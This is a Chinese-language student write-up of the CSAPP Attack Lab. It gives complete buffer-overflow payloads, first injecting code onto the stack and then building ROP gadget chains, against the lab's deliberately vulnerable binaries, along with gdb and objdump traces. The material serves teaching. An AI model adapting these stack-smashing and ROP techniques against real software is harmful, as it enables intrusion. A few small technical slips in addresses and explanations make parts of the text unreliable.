[toc]

# Code Injection Attacks

## Level 1

> 在test中调用getbuf()之后不再返回test，而是返回touch1
```
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```
![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202010840183.png)

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202011814388.png)

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202011827969.png)

我们希望改变getbuf函数在返回时选择的地址

在getbuf中，首先将栈指针减去0x28，即变为下图中的rsp的位置

最后再将rsp加0x28，然后return，return依照的其实就是rsp的值，所以想要改变返回的位置，需要在gets的时，首先读入40字节的无用数据，然后将touch1函数的起始位置放入返回地址的位置即可

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202012310629.png)

栈扩容的方式是对rsp指针进行减法，在上图中即将栈指针向上移动，指向空间的地址值减小



需要注意的是这里的地址采用了[小端存储](https://www.cnblogs.com/little-white/p/3236548.html)，高位存储在高字节，所以地址0x4017c0的存储格式为反过来的，从左到右为低字节到高字节，分别对应c0，17和40。这个点在pdf中有提到，给了示例

> To create the word 0xdeadbeef you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byte ordering).

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

```shell
./hex2raw < 1.txt > 1.in # 将上述16进制字符串转换为字符串
./ctarget -qi 1.in # 验证答案是否正确
```



## Level 2

与Level_1区别

- 相同之处：都是在test()时执行getbuf()，然后在getbuf()结束时跳转到其他函数

- 不同之处：Level_1只需实现跳转即可，只需要修改返回地址。而Level_2在返回到其他位置之外还要实现函数传参的操作

首先需要知道的是函数参数的存放位置在rdi寄存器中，要传递的参数值为cookie.txt中的内容，即0x59b997fa

因此我们需要将这个数据放入到rdi寄存器中

到这里其实可以看出与Level_1其实是完全不同的

Level_1仅仅是修改了指令要选择的数据，并没有对指令进行任何操作

但是这里如果我们想要完成目标，是需要执行额外的指令的

而执行指令的方式为在getbuf()执行时利用缓冲区溢出

也就是说我们需要在getbuf调用gets之后在retq之前，实现将指定数据放入rdi寄存器，然后再跳转到touch2

这里需要明白的一点是程序只是在执行pc寄存器指向的位置，在getbuf中，当执行玩add $0x28, %rsp之后pc寄存器就指向了retq，也就是说我们要做的是直接覆盖这条指令

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202011814388.png)

当然，上面这样想是错误的，我们能做的操作仅仅是在读入字符串时多读入一些内容，即我们所能影响到的仅是return的地址，并不能直接影响return这条指令

但是return到的位置就是接下来开始执行指令的位置，

有一天我没有想到的是堆栈指针居然是固定的，我一直认为不同的运行堆栈开辟的位置会不同，堆栈指针都会发生变化，这也就是有无栈随机化的区别，之所以没有随机化，所以我们可以直接选择某个地址。

第一次跳转到要执行的代码处我可以理解，不能理解的是第二次跳转所需要的地址要存放在rsp+48这个位置，这也就意味着rsp指针自己发生了改变

现在需要验证的是在return到待执行指令后，rsp所存放的值自动加8，就像pc一样，每执行完一条指令数值自动加1，需要在getfub中添加断点查看原始值，然后在touch2最开始处添加断点再次查看rsp的值

验证结果的确如上面所说，感觉是retq指令执行后发生弹栈，因此rsp指向的位置自动向后加8

这里的实现逻辑是这样的

1. 首先在40字节之后放入一个地址，这个地址应当指向我们要执行的赋值指令

   具体这个指令放在哪里，我的感觉是只要不会引发异常的位置都可以放置，一个方便的选择是放在直接放在gets存放数据的位置，反正栈空间也是要开辟40字节，gets总归是要读入数据，那不妨就将待执行指令放到gets读入数据的初始位置

2. 赋值之后还需要跳转到touch2函数，因此还需要添加一条跳转指令jmp

需要使用的数据

1. gets读入数据的初始位置，需要通过gdb添加断点查看rsp的值

   这里有一点是我没有想到的是堆栈地址居然不会随着程序不同次的运行而发生改变

   gets读入数据的初始位置为：`0x5561dc78`

2. 获得汇编指令对应的机器指令

   这里我们需要填写的是16进制数，相当于机器指令，而指令是汇编代码，所以还需要使用gcc将汇编代码转变为机器指令，这里是没有想到的

   所需要的指令

   ```assembly
   mov 0x59b997fa,%rdi #将参数cookie.txt的值放入寄存器中
   jmp 0x4017ec #跳转到touch2函数
   ```

   这里有个问题是[jmp指令](https://www.jianshu.com/p/c685c1c033ff)另外涉及到cs和ip寄存器，地址求解较为复杂，上面的写法好似不对，所以这里采用博客里面使用的方法，再进行一次retq，返回到touch2

   ```shell
   mov 0x59b997fa,%rdi #将参数cookie.txt的值放入寄存器中
   retq
   ```

   ```shell
   gcc -c 2.s # 将汇编代码汇编为目标文件
   objdump -d 2.o # 反汇编获得机器指令
   ```

   > 注：这里为何要首先对汇编代码进行汇编再进行反汇编得到汇编代码？
   >
   > 我们的目标是获得汇编指令对应的机器指令，第一次的汇编代码是我们手写的，第二次的汇编代码是通过反汇编得到的，通过还具有汇编指令对应的机器指令

```
2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 8b 3c 25 fa 97 b9 	mov    0x59b997fa,%rdi
   7:	59 
   8:	c3                   	retq
```

​		上面我犯了一个错误是mov指令中立即数之前需要添加`$`符号，我没有写

修正后结果为

```assembly
mov $0x59b997fa,%rdi #将参数cookie.txt的值放入寄存器中
retq
```

```shell
2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	c3                   	retq
```



3. 将touch2的地址放到rsp中，以便实现第二次return到touch2

   这里有一点很重要，即在第一次retq后，发生弹栈，因此rsp自动加8了

   栈中布局如下

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202030025387.png)

```
48 c7 c7 fa 97 b9 59 c3 //待执行指令
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 //第一次retq的地址，指向上述待执行指令
ec 17 40 00 00 00 00 00 //第二次retq的地址，即touch2的地址
```

## Level_3

看似与Level_2一样，实则有两点不同

1. 读入由数据变为字符串

   数字直接放在寄存器中就可以了

   字符串传参实际传递的是一个地址，存放字符串开始的位置

   要做的有两件事情

   1. 要把cookie的值改为16进制

      `0x59b997fa` 的16进制表示：`35 39 62 39 39 37 66 61 00`(没有0x，最后添加'\n'结束符(对应16进制的00))

   2. 要为这段字符串找个存储的位置

2. 涉及到的函数由1个(touch2)变为2个(touch3 和 hexmatch)

前期的操作流程与Level_2是一样的

同样需要向寄存器中存储值，只不过存储的值由cookie的数值变为存储这个数值对应16进制的地址

与touch2相比，把第二次retq取址位置存储的值由touch2函数地址改为touch3函数地址

把mov指令的cookie.txt的数值改为一个地址

```assembly
mov $0x59b997fa,%rdi #将参数cookie.txt的值放入寄存器中
retq
```

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202030025387.png)

区别中的第2点是多了一个函数，这个函数中开辟了一个110字节的空间

必须保证cookie的16进制存放的位置不处在这110字节当中，防止数值被干扰

一种想法是向栈底方向存放，另一种想法是向栈顶方向存放

对于第一种想法，需要查看能否向getbuf栈帧下方存放数据，是否会干扰其他数值

另一种想法则需要在之后开辟的110字节之外存放

对于第一种思想，查看后发现这部分是test栈帧的空白区，可以存放数据

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202031622264.png)

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202040847616.png)

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202031639191.png)

其实Level_2我们就已经用上了test栈帧，但是当时没有考虑到这一层次

在Level_3中，我们既需要存储cookie，又需要存储touch3的初始地址，仅用一个test栈帧的空白区显然是不够用的，因此需要采用新开辟栈的空间，其实Level_2就应当这么做了，在指令中加入push指令向栈中压入touch3的地址，rsp的值自动更改为这个位置，retq就直接返回到touch3了，从现在来看，Level_2我们就应当使用push指令

1. 确定test栈帧空白区地址

   ```shell
   (gdb) disas
   Dump of assembler code for function test:
   => 0x0000000000401968 <+0>:	sub    $0x8,%rsp
      0x000000000040196c <+4>:	mov    $0x0,%eax
      0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
      0x0000000000401976 <+14>:	mov    %eax,%edx
      0x0000000000401978 <+16>:	mov    $0x403188,%esi
      0x000000000040197d <+21>:	mov    $0x1,%edi
      0x0000000000401982 <+26>:	mov    $0x0,%eax
      0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
      0x000000000040198c <+36>:	add    $0x8,%rsp
      0x0000000000401990 <+40>:	retq   
   End of assembler dump.
   
   (gdb) print /x $rsp
   $1 = 0x5561dcb0
   
   (gdb) stepi
   92	in visible.c
   
   (gdb) disas
   Dump of assembler code for function test:
      0x0000000000401968 <+0>:	sub    $0x8,%rsp
   => 0x000000000040196c <+4>:	mov    $0x0,%eax
      0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
      0x0000000000401976 <+14>:	mov    %eax,%edx
      0x0000000000401978 <+16>:	mov    $0x403188,%esi
      0x000000000040197d <+21>:	mov    $0x1,%edi
      0x0000000000401982 <+26>:	mov    $0x0,%eax
      0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
      0x000000000040198c <+36>:	add    $0x8,%rsp
      0x0000000000401990 <+40>:	retq   
   End of assembler dump.
   
   (gdb) print /x $rsp
   $2 = 0x5561dca8
   ```

   

2. 编写指令并获取对应机器指令

   ```assembly
   mov $0x5561dca8,%rdi # test栈帧空白区地址
   pushq $0x4018fa # touch3入口地址
   retq
   ```

   ```shell
   ghy@vm:/mnt/hgfs/CSAPP-Labs/Labs/Lab3-attack/target1/Level_3$ vim 3.s
   
   ghy@vm:/mnt/hgfs/CSAPP-Labs/Labs/Lab3-attack/target1/Level_3$ gcc -c 3.s
   
   ghy@vm:/mnt/hgfs/CSAPP-Labs/Labs/Lab3-attack/target1/Level_3$ ls
   3.o  3.s  cookie.txt  ctarget  hex2raw
   
   ghy@vm:/mnt/hgfs/CSAPP-Labs/Labs/Lab3-attack/target1/Level_3$ objdump -d 3.o
   
   3.o：     文件格式 elf64-x86-64
   
   
   Disassembly of section .text:
   
   0000000000000000 <.text>:
      0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
      7:	68 fa 18 40 00       	pushq  $0x4018fa
      c:	c3                   	retq
   ```

3. 确定getbuf栈帧空白区地址

   ```
   (gdb) disas
   Dump of assembler code for function getbuf:
   => 0x00000000004017a8 <+0>:	sub    $0x28,%rsp
      0x00000000004017ac <+4>:	mov    %rsp,%rdi
      0x00000000004017af <+7>:	callq  0x401a40 <Gets>
      0x00000000004017b4 <+12>:	mov    $0x1,%eax
      0x00000000004017b9 <+17>:	add    $0x28,%rsp
      0x00000000004017bd <+21>:	retq   
   End of assembler dump.
   
   (gdb) print /x $rsp
   $3 = 0x5561dca0
   
   (gdb) stepi
   14	in buf.c
   
   (gdb) print /x $rsp
   $4 = 0x5561dc78
   ```

4. 计算cookie的16进制格式

   `35 39 62 39 39 37 66 61 00`

5. 编写输入字符串的16进制格式并使用hex2raw转换为字符串格式

   ```
   48 c7 c7 a8 dc 61 55 68 // 待执行指令
   fa 18 40 00 c3 00 00 00 //
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00 // 上方待执行指令地址
   35 39 62 39 39 37 66 61 // 传参字符串
   ```

   `./hex2raw < 3.txt > 3.in`

   

# Return-Oriented Programming

接下来两个实验分别与上面的Level_2和Level_3目标是完全相同的，先传参再转到另外的函数

不同点在于，存放在栈中的数据不再可执行，也就是说我们不能再通过在栈中构造指令执行某些操作了，取而代之的方法是从现有的指令中挑选一些再结合栈的使用达到我们的目的

## Level_4

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202030025387.png)

```assembly
mov $0x59b997fa,%rdi #将参数cookie.txt的值放入寄存器中
retq
```

本实验需要实现赋值操作，将rdi的值设置为cookie的值。赋值操作有两种方法

1. mov指令：除非我们可以找到现成指令中恰好有一个`48 c7 c7 fa 97 b9 59`(代表`mov $0x59b997fa,%rdi`指令)序列，但是经查找并没有找到
2. pop指令：pop指令可以将栈中的数值弹出并放入到寄存器中，所以我们只需要向栈中放入数值然后弹栈，执行`popq %rdi`即可

设getbuf开辟空间后的栈指针所在位置为rsp

所以我们考虑在getbuf的返回时返回到一个恰好为`popq %rdi`指令的位置，即rsp+0x28的位置是一个地址，指向`popq %rdi`指令，此时栈指针指向rsp+0x28

上述过程结束后，栈指针会指向rsp+0x28+0x8的位置

此时指向`popq %rdi`指令，弹出的就是rsp+0x28+0x8这个位置的数据并放入rdi寄存器中，所以这个位置应当存放cookie的数值

完成传参操作后，需要考虑如何跳转到touch2函数，即还需要一条retq语句

弹栈之后，栈指针指向rsp+0x28+0x8+0x8的位置，这个位置已经是test栈帧中的部分了，而且恰好是存放test返回地址的位置，但是我们并不能通过test的retq跳转到touch2，因为Level_2的要求是getbuf之后不返回test而是直接跳转到touch2，如果通过test完成跳转，那么实际上不符合要求了

一条指令不能直接构造，必须从现有的指令中选择，也就是说上述popq指令后还需要顺次执行retq指令，很巧的是，恰好有如下内容，即只需要在弹栈之后的栈指针位置，即rsp+0x28+0x8+0x8处放入touch2的地址即可，栈的分布情况如下图所示

```assembly
2178   402b18:   41 5f                   pop    %r15                                                    
2179   402b1a:   c3                      retq
```

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202032136381.png)

1. 待执行指令地址

   0x402b18 + 0x1 = 0x402b19

2. cookie

   0x59b997fa

3. touch2函数入口地址

   4017ec

综上，答案为

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
19 2b 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
ec 17 40 00 00 00 00 00
```

> 疑问
>
> 既然存在栈随机化，各种函数的入口地址不同次运行时结果应当不同才对
>
> 那么按理说我们的操作中就不应当涉及到任何一个地址，可是上面我们用到了待执行指令，还是直接使用了它的地址，可以结果确实通过了，这是为什么，栈随机化究竟应当怎么理解？
>
> 答：
>
> 错误，随机化只是栈随机化，代码并不处在栈之中，上面我们唯一涉及到的一个地址是代码的地址而非栈中的地址
>
> 栈随机化限定我们的操作是，比如在Level_3中我们使用test堆栈空白区时，直接使用了它的地址，这种操作是在随机化之后不能使用的了

##  Level_5

![](https://cdn.jsdelivr.net/gh/G-ghy/cloudImages@master/202202031639191.png)

栈随机化，那么栈内的情况就变得不可预估了，那随意占用空间难道不会出问题吗？

先不考虑这个问题，往下做，最后再说

如果不考虑以上问题，那么现在解决问题的关键就有3点

1. 将cookie的16进制表示写入栈中
2. 将上述数据的地址写入rdi中
3. 跳转到touch3函数

对于第1点和第3点，是不难完成的，只需要我们把数据手动放入栈中即可

但是对于第2点，由于栈随机化的存在，栈上的地址都是运行时变化的，因此都不能采用显式的，**只能通过指令获取到这个地址**，这个想法就是解决这个问题关键的入手点，因为我们知道的可以获取地址的指令就是lea，但是在pdf中并没有lea指令的编码，但是却可以直接找到一条指令是 `lea (%rdi,%rsi,1),%rax`

这条指令的效果是将%rdi的内容和%rsi的内容相加后放入到rax中

这个加法就对应着一种应对运行时变化地址的处理方法，就是通过**首地址+偏移量**的方式获取到一个指定位置的地址

所以我们可以通过获取栈顶地址，加上栈顶到cookie在栈中与栈顶的偏移量获取到cookie的地址

所以我们可以采取以下两种方案之一：

1. rdi存储栈顶地址， rsi存储偏移量
2. rsi存储栈顶地址，rdi存储偏移量

>  每执行一次retq，都会选择栈顶指针所指向的空间存储的值作为返回地址，同时栈顶指针减1指向下一个空间，而每一个gadget都是开始一个语句，然后一个retq指令，从getbuf的返回地址开始，执行一次retq，栈顶指针下移，开始执行返回地址指向的指令，指令中同样有一个retq指令，跳转到栈顶指针指向的空间的指令，也就是说我们只需要把需要执行的指令顺次排列即可实现顺次执行

### 获取栈顶地址

rsp寄存器相当于一个指针，存储的值是一个地址，所以栈顶指针的获取方式比较简单

- mov %rsp, %rdi (48 89 e7)
- mov %rsp, %rsi (48 89 e6)

经查验，mov %rsp, xxx只有一个48 89 e0(`mov %rsp,%rax`)可以使用，地址为401a06

接下来查看`mov %rax,xxx`相关可用指令，发现有一个48 89 c7 c3(`mov %rax,%rdi`)(这个c3直接跟在后面，我一下子还每看出来)，地址为4019a2

现在已经成功地将栈顶地址放入到rdi寄存器中，所以看来我们需要采取的是第一种方案，接下来需要向rsi中存储偏移量

```assembly
mov %rsp,%rax # 401a06
mov %rax,%rdi # 4019a2
```

### 获取偏移量

偏移量是由我们写入栈空间的，我们需要做的是将这个值放入到rsi寄存器中

显然，需要采用pop指令

经查验，只有`popq %rax`可以使用，地址为4019ab或4019cc，这里对应的编码是58 90 c3，这个90是nop指令，一下还没看出来

所以接下来，查看可以执行的`mov %rax,xxx`指令，在上面我们找过，只有一个48 89 c7 c3(`mov %rax,%rdi`)可以使用，但是我们不能使用这个，这样会把已经找好的栈顶指针所覆盖，这里需要用到的是rax中低32bit的寄存器，首先，这个实验的大前提就是运行在32位机上，所以32bit的寄存器足以存储一个数据

所以我们查找可以执行的`mov %eax,xxx`指令

- 89 c7 c3 ，地址 4019a03，`movl %eax,%edi`
- 89 c7 90 c3，地址 4019c6，`movl %eax,%edi`
- 89 c2 90 c3，地址 4019dd，`movl %eax,%edx`

由于不能影响rdi的值，所以只能采用第3条

所以接下来寻找`mov %edx,xxx`指令，找到一个89 d1 91 c3，前面的89 d1是`movl %edx,%ecx`，不过在retq之前多了一个91，经过[查询](https://www.cnblogs.com/songyaqi/p/12074331.html)，得知其是将eax和ecx的内容进行交换的指令，这个指令无用且对重要寄存器不会产生影响，所以可以采用401a70

`0:	91                   	xchg   %eax,%ecx`

接下来寻找`mov %ecx,xxx`指令或者`mov %rcx,xxx`指令。

- 89 ce 90 90 c3，地址401a13，`movl %ecx,%esi`
- 89 ce 92 c3，地址401a63，0x92是`xchg eax,edx`(交换eax和edx的值，但是目前值处在ecx中，eax和edx的值无所谓),`movl %ecx,%esi`

既然有可以存放到esi的指令，就不需要再寻找从rcx赋值的语句了

```assembly
popq %rax # 4019ab 或 4019cc
movl %eax,%edx # 4019dd
movl %edx,%ecx # 401a70
movl %ecx,%esi # 401a13
```

### 根据栈顶地址和偏移量获取cookie地址并存储到rdi中

```assembly
lea (%rdi,%rsi,1),%rax # 4019d6
mov %rax,%rdi # 4019a2
```

上述代码框中只是包含要执行的代码，并没有包含数据，下面的描述是完整的

```assembly
1. ... getbuf空白区和未用空间
2. getbuf返回地址空间：mov %rsp,%rax # 401a06
3. mov %rax,%rdi # 4019a2
4. popq %rax # 4019ab 或 4019cc
5. 待放入rax中的偏移量，在mov %rax,%rdi执行retq时，rsp指向popq    %rax，所以返回到popq指令处，同时retq指令的执行也会让rsp减1指向	popq下面的空间，所以popq的内容刚好可以放到rax中
6. movl %eax,%edx # 4019dd
7. movl %edx,%ecx # 401a70
8. movl %ecx,%esi # 401a13
9. lea (%rdi,%rsi,1),%rax # 4019d6
10. mov %rax,%rdi # 4019a2
11. touch3函数入口地址
12. cookie的16进制格式
```

cookie只能放在最后，因为上面的指令需要连续执行，必须协调retq指令和rsp的关系，cookie的值不能插在它们之中

下面需要计算一下偏移量的值，

在执行`mov %rsp, %rax`时，rsp已经移动到`mov %rax, %rdi`的位置了，此时rsp的值为此处的首地址，可以计算得到cookie的首地址为rsp+0x48,所以最终答案如下

```assembly
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 # mov %rsp,%rax
a2 19 40 00 00 00 00 00 # mov %rax,%rdi
ab 19 40 00 00 00 00 00 # popq %rax
48 00 00 00 00 00 00 00 # 偏移量
dd 19 40 00 00 00 00 00 # movl %eax,%edx
70 1a 40 00 00 00 00 00 # movl %edx,%ecx
13 1a 40 00 00 00 00 00 # movl %ecx,%esi
d6 19 40 00 00 00 00 00 # lea (%rdi,%rsi,1),%rax
a2 19 40 00 00 00 00 00 # mov %rax,%rdi
fa 18 40 00 00 00 00 00 # touch3入口地址
35 39 62 39 39 37 66 61 # cookie
```

回过头来看，解决这个问题的突破口就在考虑到获取cookie的地址，而能够获取地址的汇编代码就是lea指令，从而考虑到使用栈顶地址和偏移量获得cookie地址
